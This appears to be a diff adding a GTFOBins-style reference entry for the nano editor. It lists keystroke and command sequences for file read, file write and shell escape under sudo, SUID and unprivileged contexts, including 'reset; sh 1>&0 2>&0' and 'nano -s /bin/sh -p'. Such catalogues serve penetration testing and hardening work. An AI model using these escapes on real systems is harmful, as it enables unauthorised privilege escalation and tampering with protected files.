@@ -1,0 +1,71 @@
+nano
+====
+
+File read
+---------
+
+[Sudo]
+    nano /path/to/input-file
+    The file content is displayed in the terminal interface.
+
+[SUID]
+    nano /path/to/input-file
+    The file content is displayed in the terminal interface.
+
+[Unprivileged]
+    nano /path/to/input-file
+    The file content is displayed in the terminal interface.
+
+File write
+----------
+
+[Sudo]
+    nano /path/to/output-file
+DATA
+^O
+
+[SUID]
+    nano /path/to/output-file
+DATA
+^O
+
+[Unprivileged]
+    nano /path/to/output-file
+DATA
+^O
+
+Shell
+-----
+
+[Sudo]
+    nano
+^R^X
+reset; sh 1>&0 2>&0
+
+[SUID]
+    nano
+^R^X
+reset; sh 1>&0 2>&0
+
+[Unprivileged]
+    nano
+^R^X
+reset; sh 1>&0 2>&0
+
+[Sudo]
+    nano -s /bin/sh
+/bin/sh
+^T^T
+    The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.
+
+[SUID]
+    nano -s '/bin/sh -p'
+/bin/sh -p
+^T^T
+    The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.
+
+[Unprivileged]
+    nano -s /bin/sh
+/bin/sh
+^T^T
+    The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.
